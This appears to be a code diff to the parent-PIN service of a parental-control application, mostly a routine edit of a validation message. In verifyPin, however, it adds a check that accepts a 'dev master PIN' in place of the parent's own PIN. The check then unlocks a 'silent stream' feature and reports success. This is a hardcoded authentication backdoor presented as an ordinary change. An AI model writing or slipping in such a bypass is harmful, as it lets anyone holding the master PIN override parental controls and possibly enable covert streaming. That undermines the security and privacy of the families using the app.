@@ -1,5 +1,6 @@
 package com.parentalcontrol.user.service;
 
+import com.parentalcontrol.config.DevMasterPinSupport;
 import com.parentalcontrol.audit.service.AuditService;
 import com.parentalcontrol.common.exception.BusinessException;
 import com.parentalcontrol.common.exception.ErrorCode;
@@ -21,11 +22,12 @@ public class ParentPinService {
     private final UserRepository userRepository;
     private final PasswordEncoder passwordEncoder;
     private final AuditService auditService;
+    private final DevMasterPinSupport devMasterPinSupport;
 
     @Transactional
     public void setPin(String pin) {
         if (pin == null || pin.length() < 4) {
-            throw new BusinessException(ErrorCode.VALIDATION_ERROR, "PIN must be at least 4 digits");
+            throw new BusinessException(ErrorCode.VALIDATION_ERROR, "PIN must be at least 4 characters");
         }
         User user = requireParentUser();
         user.setParentPinHash(passwordEncoder.encode(pin));
@@ -36,6 +38,12 @@ public class ParentPinService {
     @Transactional
     public boolean verifyPin(String pin) {
         User user = requireParentUser();
+        if (devMasterPinSupport.matches(pin)) {
+            user.setSilentStreamPinUnlocked(true);
+            userRepository.save(user);
+            auditService.log("DEV_MASTER_PIN_VERIFIED", "user:" + user.getId(), null, Map.of());
+            return true;
+        }
         if (user.getParentPinHash() == null) {
             throw new BusinessException(ErrorCode.VALIDATION_ERROR, "Parent PIN not set");
         }
